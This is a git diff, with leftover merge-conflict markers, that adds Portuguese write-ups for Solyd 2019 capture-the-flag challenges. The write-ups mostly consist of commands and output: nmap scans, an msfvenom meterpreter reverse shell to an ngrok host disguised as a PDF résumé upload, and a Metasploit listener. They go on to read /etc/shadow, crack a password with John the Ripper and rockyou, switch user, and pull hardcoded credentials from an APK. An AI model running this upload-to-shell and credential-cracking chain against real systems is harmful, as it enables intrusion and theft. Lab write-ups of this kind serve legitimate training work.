@@ -522,3 +522,252 @@ Observação: também seria possível recuperar a flag usando:
 strings -n 1 license.bin
 
 E reconstruindo manualmente os caracteres.
+<<<<<<< HEAD
+=======
+
+
+CTF 2019 – Solyd
+Desafio 3: Desenvolvimento GoHorsa
+Flag 1 – Upload malicioso e Reverse Shell
+
+A exploração iniciou com um scan utilizando Nmap para identificar serviços ativos e tentar descobrir o sistema operacional.
+
+Comando utilizado:
+
+nmap 13.220.23.173 -O
+
+Resultado:
+
+PORT     STATE    SERVICE
+25/tcp   filtered smtp
+8080/tcp open     http-proxy
+
+Foi identificado apenas um serviço web na porta 8080.
+
+Análise da aplicação web
+
+Ao acessar o site foram encontrados:
+
+página de registro
+
+página de login
+
+página de recrutamento
+
+Na página de recrutamento era possível enviar um currículo em PDF.
+
+Isso indicava uma possível vulnerabilidade de upload de arquivos.
+
+A estratégia foi enviar um arquivo malicioso disfarçado de PDF contendo uma reverse shell.
+
+Criação do payload
+
+Foi utilizado msfvenom para gerar um payload Linux.
+
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=0.tcp.sa.ngrok.io LPORT=14520 -f elf > shell.pdf
+
+Observação: o arquivo foi nomeado como PDF, mas na verdade é um executável ELF.
+
+Listener no Metasploit
+
+Foi iniciado um listener com Metasploit.
+
+use exploit/multi/handler
+set payload linux/x86/meterpreter/reverse_tcp
+set lhost 0.0.0.0
+set lport 4444
+exploit
+
+Após o upload do arquivo malicioso na aplicação web, foi recebida uma conexão reversa.
+
+Resultado:
+
+Meterpreter session 1 opened
+Acesso ao sistema
+
+Foi obtido acesso ao shell:
+
+meterpreter > shell
+
+Listando arquivos:
+
+ls -la
+
+Resultado:
+
+reverse_2026-03-09_01_56
+reverse_2026-03-09_01_57
+reverse_2026-03-09_02_03
+reverse_2026-03-09_02_05
+
+Melhorando a shell:
+
+python -c "import pty; pty.spawn('/bin/bash')"
+
+Dentro da shell foi encontrada a primeira flag:
+
+Solyd{34sy_p34sy}
+Flag 2 – Quebra de hash
+
+Já dentro da máquina foi tentado acessar o arquivo:
+
+/etc/shadow
+
+Comando:
+
+cat /etc/shadow
+
+Foi possível visualizar as hashes dos usuários, incluindo:
+
+github:$6$hfGGddWa$...
+Identificação dos usuários
+
+Arquivo analisado:
+
+cat /etc/passwd
+
+Usuários relevantes:
+
+github:x:1000:1000:/home/github:/bin/bash
+exploited:x:1001:1001:/home/exploited:/bin/bash
+Preparação da hash
+
+Foi utilizado unshadow para preparar o arquivo de cracking.
+
+Depois foi isolada a hash do usuário github.
+
+Quebra da senha
+
+Foi utilizado John the Ripper com a wordlist rockyou.
+
+john hash.txt --wordlist=rockyou.txt
+
+Resultado:
+
+456456456 (github)
+
+Senha descoberta:
+
+456456456
+Escalada de usuário
+
+Dentro da shell:
+
+su github
+
+Senha:
+
+456456456
+
+Após o login, foi exibida a segunda flag:
+
+Solyd{Brut3_F0rc3_t0P}
+Flag 3 – Análise de APK
+
+Dentro da home do usuário github foi encontrado o diretório:
+
+insecure-apk
+
+Listagem:
+
+ls -la
+
+Resultado:
+
+drwxrwx--- insecure-apk
+
+Dentro do diretório havia:
+
+um arquivo README
+
+um arquivo APK
+
+Decompilação do APK
+
+O APK foi baixado e analisado utilizando um decompilador de APK online.
+
+Durante a análise do código fonte foi encontrado o seguinte trecho:
+
+public static final String[] DUMMY_CREDENTIALS = {
+    "admin@fake.com:D2xk5PRS112keUcL"
+};
+
+Ou seja, o aplicativo continha credenciais hardcoded.
+
+Credenciais encontradas:
+
+admin@fake.com
+D2xk5PRS112keUcL
+Login na aplicação
+
+Utilizando essas credenciais no site foi possível realizar login.
+
+Após o login, o sistema revelou a terceira flag:
+
+Solyd{J4v4_T0P}
+
+
+
+CTF solyd 2019
+Desafio 4:
+Hacker Rock Story
+no iniciamos o ataque fazendo um reconechimento com o nmap que nos retornou o seguinte:
+nmap 44.199.236.83          
+Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-09 16:16 -0400
+Nmap scan report for ec2-44-199-236-83.compute-1.amazonaws.com (44.199.236.83)
+Host is up (0.14s latency).
+Not shown: 997 closed tcp ports (reset)
+PORT     STATE    SERVICE
+22/tcp   open     ssh
+25/tcp   filtered smtp
+5000/tcp open     upnp
+
+Nmap done: 1 IP address (1 host up) scanned in 15.94 seconds
+
+sem saber o que e na porta 5000 usamos o Netcat para vê o se descobrimos algos:
+e o resultado foi:
+
+nc  44.199.236.83 5000          
+
+Bem vindo ao desafio! Esse desafio se trata de um trabalho universitario envolvendo processamento de imagens onde queremos mostrar novas formas de enviar QR Codes pela internet. Envie "Ok" Para comecar o desafio.
+
+
+
+com isso nós criamos um script em python que envia o ok pra nos e assim com toda a configuração de bytes e rbg nos recriamos a imagem e depos fazemos um decode dela
+e assim apaereceu a flag
+import socket, time
+from PIL import Image, ImageOps
+from pyzbar import pyzbar
+
+ip = "172.18.4.3"
+port = 5000
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((ip, port))
+
+print(s.recv(1024).decode())
+s.send(b"ok")
+
+while 1:
+    time.sleep(0.5)
+
+    data = s.recv(100000).decode()
+    data = data.replace(" ", "").split(";")
+
+    qrcode = Image.new("RGB", (len(data), len(data)))
+    data.pop()
+
+    for i in range(len(data)):
+        data[i] = data[i].split(",(")
+        for j in range(len(data)):
+            data[i][j] = tuple(
+                map(int, data[i][j].replace("(", "").replace(")", "").split(","))
+            )
+            pixel = data[i][j]
+            qrcode.putpixel((i, j), pixel)
+
+    qrcode = ImageOps.expand(qrcode, border=3, fill="white")
+    s.send(pyzbar.decode(qrcode)[0][0])
+Solyd{4s_C0iS4s_L4m3nTam_}
+
+>>>>>>> 53b1b739576e517a31b276009d059279c20574b9
